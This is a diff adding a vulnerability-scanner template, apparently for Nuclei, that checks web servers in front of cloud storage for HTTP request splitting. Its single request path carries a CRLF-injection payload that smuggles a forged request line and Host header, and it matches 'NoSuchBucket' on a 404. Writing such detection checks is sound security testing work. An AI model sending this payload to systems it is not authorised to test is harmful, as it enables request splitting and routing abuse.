@@ -1,0 +1,29 @@
+id: http-splitting-cloud-storage
+
+info:
+  name: HTTP Splitting with cloud storage
+  author: reewardius
+  severity: high
+  reference: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+  tags: crlf
+  metadata:
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%20HTTP/1.1%0d%0aHost:non-existing-bucketrouting%0d%0a%0d%0a"
+      
+    redirects: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "NoSuchBucket"
+          - "non-existing-bucketrouting"
+        condition: and
+
+      - type: status
+        status:
+          - 404
